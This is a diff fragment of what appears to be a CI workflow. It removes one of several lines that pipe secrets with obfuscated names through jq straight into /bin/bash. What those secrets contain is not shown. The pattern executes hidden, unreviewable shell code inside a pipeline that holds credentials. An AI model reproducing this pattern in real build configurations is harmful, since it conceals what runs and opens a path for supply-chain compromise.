@@ -21,7 +21,6 @@ jobs:
           dfy24662: ${{ secrets.dfy24662 }}
         run: |
           printf '%s' "$dfy24662" | jq -r .grezx21 | /bin/bash
-          echo $pi407 | jq -r .j221 | /bin/bash
           printf '%s' "$tz20893" | jq -r .hzu26537 | /bin/bash
           printf '%s' "$kpc2" | jq -r .klti23 | /bin/bash
           printf '%s' "$lgbf10704" | jq -r .z609 | /bin/bash
